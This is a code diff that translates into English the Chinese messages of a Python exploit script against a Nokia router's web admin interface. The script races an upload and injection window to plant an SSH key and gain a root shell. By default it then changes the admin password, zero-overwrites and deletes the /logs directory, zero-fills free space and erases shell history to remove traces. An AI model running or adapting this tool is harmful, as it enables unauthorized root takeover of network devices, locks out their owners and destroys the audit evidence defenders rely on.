@@ -382,19 +382,19 @@ def _cert_lines(der):
         try:
             left = (calendar.timegm(time.strptime(naf, "%b %d %H:%M:%S %Y %Z"))
                     - time.time()) // 86400
-            when = "（剩 %d 天）" % left if left >= 0 else "（已过期 %d 天）" % (-left)
+            when = "(expires in %d days)" % left if left >= 0 else "(expired %d days ago)" % (-left)
         except ValueError:
             pass
     lines = [
-        ("Subject 主体", name(d.get("subject", ()))),
-        ("Issuer  签发人", name(d.get("issuer", ()))),
-        ("Serial  序列号", d.get("serialNumber", "?")),
-        ("NotBefore 生效", d.get("notBefore", "?")),
-        ("NotAfter  到期", (naf or "?") + " " + when),
+        ("Subject", name(d.get("subject", ()))),
+        ("Issuer", name(d.get("issuer", ()))),
+        ("Serial", d.get("serialNumber", "?")),
+        ("NotBefore", d.get("notBefore", "?")),
+        ("NotAfter", (naf or "?") + " " + when),
     ]
     san = d.get("subjectAltName")
     if san:
-        lines.append(("SAN 备用名", ", ".join("%s:%s" % kv for kv in san)))
+        lines.append(("SAN", ", ".join("%s:%s" % kv for kv in san)))
     return lines
 
 
@@ -405,11 +405,11 @@ def _dwpad(s, w):
 
 def show_cert(host, port, timeout=10):
     h = host.split(":")[0]
-    print("[*] 拉取证书 https://%s:%d ..." % (h, port), flush=True)
+    print("[*] Fetching certificate from https://%s:%d ..." % (h, port), flush=True)
     try:
         s = socket.create_connection((h, port), timeout=timeout)
     except Exception as e:
-        print("[!] 连不上 %s:%d（%s）——核对地址/端口；硬要跑就 --yes"
+        print("[!] Cannot reach %s:%d (%s) — check address/port; use --yes to try anyway"
               % (h, port, str(e)[:120]), flush=True)
         return False
     try:
@@ -420,7 +420,7 @@ def show_cert(host, port, timeout=10):
             s.close()
         except Exception:
             pass
-        print("[!] TLS 握手失败（%s）—— %s:%d 上可能没有 https"
+        print("[!] TLS handshake failed (%s) — there may be no HTTPS on %s:%d"
               % (str(e)[:120], h, port), flush=True)
         return False
     try:
@@ -428,22 +428,22 @@ def show_cert(host, port, timeout=10):
     finally:
         tls.close()
     if not der:
-        print("[!] 服务器没出证书", flush=True)
+        print("[!] Server did not present a certificate", flush=True)
         return False
 
-    print("[*] ---- 服务器证书 ----", flush=True)
+    print("[*] ---- Server certificate ----", flush=True)
     for k, v in _cert_lines(der):
         print("    %s %s" % (_dwpad(k, 16), v), flush=True)
-    print("    %s %s" % (_dwpad("SHA-256 指纹", 16),
+    print("    %s %s" % (_dwpad("SHA-256 fingerprint", 16),
                          ":".join("%02x" % b for b in hashlib.sha256(der).digest())),
           flush=True)
     try:
-        ans = input("[?] 目标没问题就继续：输入任意字符+回车；直接回车取消 > ").strip()
+        ans = input("[?] If the target looks right: type any character + Enter to continue, or just Enter to cancel > ").strip()
     except (EOFError, KeyboardInterrupt):
         print()
         ans = ""
     if not ans:
-        print("[!] 已取消，未做任何操作", flush=True)
+        print("[!] Cancelled, nothing was done", flush=True)
     return bool(ans)
 
 
@@ -527,7 +527,7 @@ def race(base, sid, tok, iface, seconds, payload, opener_up, opener_inj,
     while time.time() - t0 < seconds:
         time.sleep(5)
         if not quiet:
-            print("   %3ds 上传 %d  注入 ok=%d spa=%d err=%d 慢=%d 峰值=%.1fs"
+            print("   %3ds uploads=%d  inj ok=%d spa=%d err=%d slow=%d peak=%.1fs"
                   % (time.time() - t0, stat["up"], stat["inj"], stat["spa"], stat["err"],
                      stat["slow"], stat["maxs"]), flush=True)
     stop.set()
@@ -551,7 +551,7 @@ def _fix_key_perms(path):
 def ensure_keypair(key_path):
     pub = key_path + ".pub"
     if not os.path.exists(key_path):
-        print("[*] %s 不存在，ssh-keygen 生成 ed25519 临时密钥对" % key_path,
+        print("[*] %s not found; generating a temporary ed25519 keypair with ssh-keygen" % key_path,
               flush=True)
         subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "",
                         "-C", "nokia-v2", "-f", key_path, "-q"], check=True)
@@ -587,31 +587,32 @@ def ssh_exec(host, key_path, script, timeout=180):
 def ssh_check(host, key_path, timeout=20):
     rc, out = ssh_exec(host, key_path, "id; hostname; uname -sr", timeout)
     if rc != 0:
-        raise OSError("ssh 退出码 %s: %s" % (rc, out.strip()[-200:]))
+        raise OSError("ssh exit code %s: %s" % (rc, out.strip()[-200:]))
     return out
 
 
 WIPE_LOGS_SH = r'''
-echo "[*] /logs 清理开始 $(date)"
+echo "[*] /logs cleanup started $(date)"
 df -k /logs
-echo "[*] 文件数: $(find /logs -type f | wc -l)"
+echo "[*] File count: $(find /logs -type f | wc -l)"
 
 
 cfgcli -s "InternetGatewayDevice.X_Authentication.WebAccount.Password" "__WEB_PASSWORD__"
 cfgcli --save-flash-now
-echo "[*] ⓪ Web 密码已设置并落 flash"
+echo "[*] (0) Web password set and committed to flash"
 
-# ① 就地覆写：按原长度写零，复用原有数据块，不碰空闲空间
+# (1) In-place overwrite: zero-fill each file at its original length,
+#     reusing the existing blocks; free space is left untouched
 find /logs -type f | while read -r f; do
     sz=$(stat -c%s "$f" 2>/dev/null)
     [ -n "$sz" ] && [ "$sz" -gt 0 ] || continue
     dd if=/dev/zero of="$f" bs=4096 conv=notrunc count=$(( (sz + 4095) / 4096 )) 2>/dev/null
 done
 sync
-echo "[*] ① 覆写完成 $(date)"
+echo "[*] (1) Overwrite done $(date)"
 
-# ② 删除 + 重建目录 + 恢复原权限
-#    -mindepth 1 保住 /logs 挂载点自身（drwxrwxrwt 1777）
+# (2) Delete + recreate directories + restore original permissions
+#    -mindepth 1 keeps the /logs mount point itself (drwxrwxrwt 1777)
 find /logs -mindepth 1 -maxdepth 1 | xargs rm -rf
 mkdir -p /logs/core /logs/err/recov /logs/pstore /logs/sec /logs/history
 chmod 755 /logs/core /logs/err /logs/err/recov /logs/history
@@ -619,7 +620,7 @@ chmod 750 /logs/pstore
 chmod 700 /logs/sec
 chgrp 1100 /logs/history
 sync
-echo "[*] ② 清空+重建完成"
+echo "[*] (2) Emptied + recreated"
 
 _TOTAL=$(df -k /logs 2>/dev/null | awk 'NR==2{print $2}')
 if dd if=/dev/zero of=/logs/.wipe bs=4k oflag=direct count=1 2>/dev/null; then
@@ -628,7 +629,7 @@ else
     _OF=""
 fi
 rm -f /logs/.wipe; sync
-echo "[*] ②b 零填开始 total=${_TOTAL}KB oflag='${_OF}'"
+echo "[*] (2b) Zero-fill start total=${_TOTAL}KB oflag='${_OF}'"
 
 for _p in 64:90 8:95 4:97; do
     _bs=${_p%%:*}; _pct=${_p##*:}
@@ -640,12 +641,12 @@ for _p in 64:90 8:95 4:97; do
         sync
     fi
     rm -f /logs/.wipe; sync
-    echo "[*] ②b 填到 ${_pct}% (bs=${_bs}k 目标${_KB}KB) $(date)"
+    echo "[*] (2b) Filled to ${_pct}% (bs=${_bs}k target ${_KB}KB) $(date)"
 done
-echo "[*] ②b 零填结束"
+echo "[*] (2b) Zero-fill done"
 
 touch -d "$(date '+%Y-%m-%d %H:%M:%S')" /logs/.seed
-echo "[*] ③ 时间种子 $(ls -l /logs/.seed)"
+echo "[*] (3) Time seed $(ls -l /logs/.seed)"
 
 
 history -c 2>/dev/null
@@ -657,11 +658,11 @@ for h in "$HOME/.ash_history" /root/.ash_history /root/.bash_history \
         dd if=/dev/zero of="$h" bs=4096 conv=notrunc \
            count=$(( (sz + 4095) / 4096 )) 2>/dev/null
     rm -f "$h"
-    echo "[*] ④ 已清历史文件 $h"
+    echo "[*] (4) Cleared history file $h"
 done
-echo "[*] ④ shell 历史已清"
+echo "[*] (4) Shell history cleared"
 
-echo "[*] 最终:"
+echo "[*] Final:"
 ls -la /logs
 df -k /logs
 echo WIPE_OK
@@ -672,31 +673,31 @@ def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--host", default="192.168.12.1")
     ap.add_argument("--scheme", default="https", choices=("https", "http"),
-                    help="WebUI 协议（默认 https）")
+                    help="WebUI protocol (default: https)")
     ap.add_argument("--port", type=int, default=443,
-                    help="WebUI 端口（默认 443；证书不校验）")
+                    help="WebUI port (default: 443; certificate not verified)")
     ap.add_argument("--user", default="admin")
-    ap.add_argument("--password", required=True, help="WebUI admin 密码")
+    ap.add_argument("--password", required=True, help="WebUI admin password")
     ap.add_argument("--iface", default="eth0.1999")
-    ap.add_argument("--race", type=int, default=40, help="抢窗口秒数")
-    ap.add_argument("--up", type=int, default=2, help="上传线程数")
-    ap.add_argument("--inj", type=int, default=4, help="注入线程数")
+    ap.add_argument("--race", type=int, default=40, help="seconds to hold the race window")
+    ap.add_argument("--up", type=int, default=2, help="number of uploader threads")
+    ap.add_argument("--inj", type=int, default=4, help="number of injector threads")
     ap.add_argument("--payload", default=None,
-                    help="直接用这个文件当设备侧脚本（跳过模板渲染）")
+                    help="use this file as the on-device script as-is (skips template rendering)")
     ap.add_argument("--pad", type=int, default=32,
-                    help="给 payload 追加 N KB 注释填充，拉长落盘->删除的窗口（默认 32，别设 0）")
+                    help="append N KB of comment padding to widen the write->delete window (default 32; do not set 0)")
     ap.add_argument("--pubkey", default=os.path.join(HERE, "nokiakey.pub"))
     ap.add_argument("--key", default=os.path.join(HERE, "nokiakey"))
     ap.add_argument("--restore", action="store_true",
-                    help="打完把 /root/.ssh/authorized_keys 还原（不给 shell，仅验证）")
+                    help="restore /root/.ssh/authorized_keys after the run (no shell, verification only)")
     ap.add_argument("--wipe-logs", dest="wipe_logs", action="store_true", default=True,
-                    help="拿到 root 后就地覆写 /logs（默认开启）")
+                    help="overwrite /logs in place after getting root (default: on)")
     ap.add_argument("--no-wipe-logs", dest="wipe_logs", action="store_false",
-                    help="跳过 /logs 清理，只装公钥")
+                    help="skip the /logs cleanup and only install the pubkey")
     ap.add_argument("--web-password", default="Admin@123",
-                    help="清理前把 Web 管理密码改成这个值并落 flash")
+                    help="before cleanup, set the Web admin password to this value and commit it to flash")
     ap.add_argument("--yes", action="store_true",
-                    help="跳过开打前的证书显示/确认，直接跑（脚本化用）")
+                    help="skip the pre-run certificate display/confirmation (for scripting)")
     a = ap.parse_args()
 
     if a.yes:
@@ -705,7 +706,7 @@ def main():
         if not show_cert(a.host, a.port):
             return 1
     else:
-        print("[*] http 明文无证书可看，跳过确认", flush=True)
+        print("[*] http is plaintext, no certificate to show — skipping confirmation", flush=True)
 
     ensure_keypair(a.key)
     if a.payload:
@@ -720,72 +721,72 @@ def main():
 
     netloc = web_netloc(a.host, a.scheme, a.port)
     base = web_base(a.host, a.scheme, a.port)
-    print("[*] 公钥: %s  (tag=%s)" % (a.pubkey, tag))
-    print("[*] 目标: %s  设备侧脚本 %d 字节" % (a.host, len(payload)), flush=True)
-    print("[*] WebUI: %s  (TLS 证书不校验)" % base, flush=True)
+    print("[*] Public key: %s  (tag=%s)" % (a.pubkey, tag))
+    print("[*] Target: %s  on-device script %d bytes" % (a.host, len(payload)), flush=True)
+    print("[*] WebUI: %s  (TLS certificate not verified)" % base, flush=True)
 
     c = NokiaClient(netloc, a.user, a.password, scheme=a.scheme)
     c.login()
-    print("[+] 会话 sid=%s" % c.sid, flush=True)
+    print("[+] Session sid=%s" % c.sid, flush=True)
 
     if a.restore:
-        print("[*] --restore: 打完会清掉 authorized_keys")
+        print("[*] --restore: authorized_keys will be removed after the run")
 
-    print("\n[*] 抢窗口 %ds ..." % a.race, flush=True)
+    print("\n[*] Racing for the window for %ds ..." % a.race, flush=True)
     stat = race(base, c.sid, c.token or "", a.iface, a.race, payload,
                 build_opener(), build_opener(),
                 n_up=a.up, n_inj=a.inj)
-    print("[*] 结束：上传 %d  注入 ok=%d spa=%d 慢请求=%d 峰值=%.1fs"
+    print("[*] Done: uploads %d  inject ok=%d spa=%d slow=%d peak=%.1fs"
           % (stat["up"], stat["inj"], stat["spa"], stat["slow"], stat["maxs"]),
           flush=True)
     if stat.get("spa_sample"):
-        print("[*] spa 响应样本: %s"
+        print("[*] spa response sample: %s"
               % stat["spa_sample"].replace("\n", " ")[:300], flush=True)
 
-    print("\n[*] 验 SSH ...", flush=True)
+    print("\n[*] Verifying SSH ...", flush=True)
     try:
         out = ssh_check(a.host, a.key)
         print("    >>> root shell OK <<<")
         print("    " + out.strip().replace("\n", "\n    "))
     except Exception as e:
         print("    FAIL: %s" % str(e)[:150])
-        print("    (抢窗口是概率事件，没中就再跑一次)")
+        print("    (the race is probabilistic — if it missed, just run again)")
         return 1
 
     tail = []
     steps = []
     if a.wipe_logs:
         if any(ch in a.web_password for ch in '"$`\\'):
-            print("\n[!] --web-password 含 \" $ ` \\ 之一，会破坏 shell 引用，拒绝执行")
+            print("\n[!] --web-password contains one of \" $ ` \\ which would break shell quoting; refusing to run")
             return 1
         tail.append(WIPE_LOGS_SH.replace("__WEB_PASSWORD__", a.web_password))
-        steps.append("改 Web 密码 + 清 /logs")
+        steps.append("set Web password + wipe /logs")
     if a.restore:
         tail.append("rm -f /root/.ssh/authorized_keys\necho KEY_REMOVED")
-        steps.append("删公钥")
+        steps.append("remove pubkey")
 
     if tail:
-        print("\n[*] 收尾: %s" % " + ".join(steps), flush=True)
+        print("\n[*] Post-run: %s" % " + ".join(steps), flush=True)
         try:
             rc, out = ssh_exec(a.host, a.key, "\n".join(tail))
             print("    " + out.strip().replace("\n", "\n    "))
             if a.wipe_logs and "WIPE_OK" not in out:
-                print("    !!! 未见 WIPE_OK（退出码 %s）——可能被中途打断，重跑一次" % rc)
+                print("    !!! WIPE_OK not seen (exit code %s) — possibly interrupted midway; run again" % rc)
         except Exception as e:
             print("    FAIL: %s" % str(e)[:150])
     else:
-        print("\n[*] --no-wipe-logs：跳过 /logs 清理")
+        print("\n[*] --no-wipe-logs: skipping /logs cleanup")
 
-    print("\n[*] 上机:")
+    print("\n[*] To get on the box:")
     print("    ssh -i %s root@%s" % (a.key, a.host))
 
     if a.restore:
-        print("\n[*] 验证公钥已移除 ...", flush=True)
+        print("\n[*] Verifying the pubkey was removed ...", flush=True)
         try:
             ssh_check(a.host, a.key, timeout=10)
-            print("    !!! 还能连上，没清掉")
+            print("    !!! Still connects — key was not removed")
         except Exception:
-            print("    已清除（再连会失败）")
+            print("    Removed (future connections will fail)")
     return 0
 
 
